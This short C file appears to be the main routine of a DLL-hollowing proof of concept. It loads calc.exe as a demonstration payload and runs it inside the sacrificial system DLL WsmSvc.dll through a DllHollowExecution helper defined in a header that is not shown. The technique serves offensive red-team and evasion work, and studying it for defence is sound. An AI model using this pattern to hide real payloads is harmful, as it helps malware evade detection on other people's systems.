#include "DllHollowing.h"

#define SACRIFICAL_DLL	L"C:\\Windows\\System32\\WsmSvc.dll"
#define PAYLOAD_PE		L"C:\\Windows\\System32\\calc.exe"

int main()
{

	LPVOID FileBuffer = NULL;

	if (!ReadTargetFileW(PAYLOAD_PE, &FileBuffer))
	{
		PRINT_ERROR("ReadTargetFileW");
		return FALSE;
	}

	if (!DllHollowExecution(SACRIFICAL_DLL, FileBuffer))
	{
		PRINT_ERROR("DllHollowExecution");
		return FALSE;
	}

	WaitForSingleObject((HANDLE)-1, INFINITE);

	OKAY("DONE!");

	CHAR("Quit...");
	getchar();

	return 0;

}